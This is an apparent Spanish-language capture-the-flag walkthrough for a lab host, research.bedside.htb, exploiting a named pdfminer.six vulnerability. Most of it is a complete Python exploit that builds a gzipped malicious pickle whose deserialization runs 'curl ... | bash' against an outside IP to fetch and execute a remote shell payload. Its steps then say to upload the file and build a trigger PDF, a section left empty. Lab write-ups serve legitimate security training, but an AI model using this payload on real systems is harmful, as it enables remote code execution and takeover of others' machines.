* analiza los subdominios encontraras http://research.bedside.htb/

* La respuesta te contestará "powered by pdfminer.six" el cual es vulnerable a CVE-2025-64512

* crea un arcivo pyhton para armar el archivo de fuente malicioso

+++++++ File exp.py o cve.py
#!/usr/bin/env python3
import pickle
import gzip
import os

def create_demo_pickle():
    print("Creating demonstration pickle file...")

    class EvilPayload:
        def __reduce__(self):
            # Comando que se ejecutará al deserializar
            cmd = "curl -s http://10.10.14.193:8000 | bash"
            return (os.system, (cmd,))

    demo_cmap_data = EvilPayload()
    target_path = "./e.pickle.gz"

    try:
        with gzip.open(target_path, 'wb') as f:
            pickle.dump(demo_cmap_data, f)
        print(f"✓ Created demonstration pickle file: {target_path}")
        return target_path
    except Exception as e:
        print(f"✗ Error creating pickle file: {e}")
        return None

if __name__ == "__main__":
    create_demo_pickle()

++++++ EOF

* al ejecutar esto obtendras un archivo e.pickle.gz, subelo ar research.bedside.htb

* crea un PDF trigger que ejecute el comando malicioso (En este caso es un curl | bash)

++++ evil.pdf ++++

